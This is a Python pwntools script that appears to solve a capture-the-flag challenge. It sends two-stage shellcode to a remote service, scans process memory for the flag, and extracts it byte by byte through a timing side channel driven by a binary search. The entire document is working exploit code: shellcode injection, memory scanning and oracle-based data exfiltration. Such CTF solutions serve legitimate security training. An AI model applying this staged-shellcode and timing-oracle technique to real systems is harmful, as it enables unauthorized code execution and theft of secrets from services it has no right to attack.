from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "error"

readsc = asm(
    """
lea r8, [rip+cont]
"""
    + shellcraft.read(0, "r8", 0x100)
    + """
cont:
"""
)


def check(idx, val):
    # return true if flag[idx] <= val
    actualsc = asm(
        f"""
    xor rdi, rdi
    mov rsi, 0
    mov rdx, 1
    loop:
    add rsi, 0x1000
    xor rax, rax
    syscall
    cmp rax, 1
    jne loop
    mov eax, [rsi]
    cmp eax, 0x66746369
    jne loop

    mov r8, rsi
    mov al, [r8+{idx}]
    cmp al, {val}
    jle $+4
    jmp $
    """
    )
    # io = process("./chall")
    io = remote("ictf.maple3142.net", 1234)
    io.send(readsc.ljust(0x20, b"\0") + actualsc.ljust(0x100, b"\0") + b"i" * 0x100)
    try:
        # need to adjust this depends on network latency
        io.recvline(timeout=0.5)
        io.close()
        return False
    except EOFError:
        return True


flag = b""
while not flag.endswith(b"}"):
    l, r = 20, 127
    while l < r:
        print(len(flag), l, r)
        m = (l + r) // 2
        if check(len(flag), m):
            r = m
        else:
            l = m + 1
    flag += bytes([l])
    print(flag)
